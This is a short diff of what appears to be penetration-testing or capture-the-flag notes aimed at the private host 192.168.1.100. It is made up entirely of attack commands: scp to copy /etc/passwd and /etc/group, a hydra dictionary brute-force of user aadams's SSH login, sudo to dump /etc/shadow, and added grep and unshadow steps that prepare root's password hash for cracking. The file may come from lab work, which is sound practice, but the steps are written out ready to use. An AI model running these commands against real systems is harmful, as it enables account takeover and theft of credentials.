@@ -6,5 +6,10 @@ scp bbanter@192.168.1.100:/etc/passwd .
 scp bbanter@192.168.1.100:/etc/group .
 hydra -l aadams -P dictionary ssh://192.168.1.100
 ssh aadams@192.168.1.100
+	sudo -l
 	sudo cat /etc/shadow > shadow
 scp aadams@192.168.1.100:shadow .
+grep root passwd > passwd_root
+grep root shadow > shadow_root
+unshadow passwd_root shadow_root > unshadow_root
+
